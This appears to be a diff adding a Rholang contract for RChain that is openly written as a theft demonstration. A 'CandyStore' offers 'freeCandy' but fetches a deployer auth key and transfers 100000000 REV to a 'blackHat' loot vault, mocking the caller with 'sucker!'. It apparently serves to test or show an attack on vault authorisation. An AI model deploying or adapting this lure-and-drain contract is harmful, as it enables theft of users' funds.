@@ -1,0 +1,41 @@
+new result,
+CandyStore,
+blackHat, piggyBankCh,
+deployerId(`rho:rchain:deployerId`),
+RevAddress(`rho:rev:address`),
+RevVaultCh,
+stdout(`rho:io:stdout`),
+regLookup(`rho:registry:lookup`),
+regInsert(`rho:registry:insertArbitrary`)
+in {
+  new uriCh in {
+    regInsert!(bundle+{*CandyStore}, *uriCh) | for (@uri <- uriCh) {
+      stdout!({"CandyStore": bundle+{*CandyStore}, "registered at": uri})
+      |
+      regLookup!(`rho:rchain:revVault`, *RevVaultCh) |
+      for (@(_, *RevVault) <- RevVaultCh) {
+        RevAddress!("fromUnforgeable", *blackHat, *piggyBankCh) | for (@piggyBankAddr <- piggyBankCh) {
+          stdout!({"CandyStore": uri, "lootAddr": piggyBankAddr}) |
+          result!({"CandyStore": uri, "lootAddr": piggyBankAddr}) |
+          RevVault!("findOrCreate", piggyBankAddr, *piggyBankCh) |
+          for (@(true, *piggyBank) <- piggyBankCh) {
+            stdout!({"piggyBank": *piggyBank}) |
+            contract CandyStore(@"freeCandy", ret) = {
+              stdout!({"deployerId": *deployerId, "asked for": "freeCandy"}) |
+              new txfrCh, authKeyCh in {
+                RevVault!("deployerAuthKey", *deployerId, *authKeyCh) | for (@authKey <- authKeyCh) {
+                  stdout!({"deployer auth key": authKey}) |
+                  RevVault!("transfer", *piggyBank, 100000000, authKey, *txfrCh) |
+                  for (@txfr <- txfrCh) {
+                    stdout!({"loot:": 100000000, "result": txfr}) |
+                    ret!("sucker!")
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
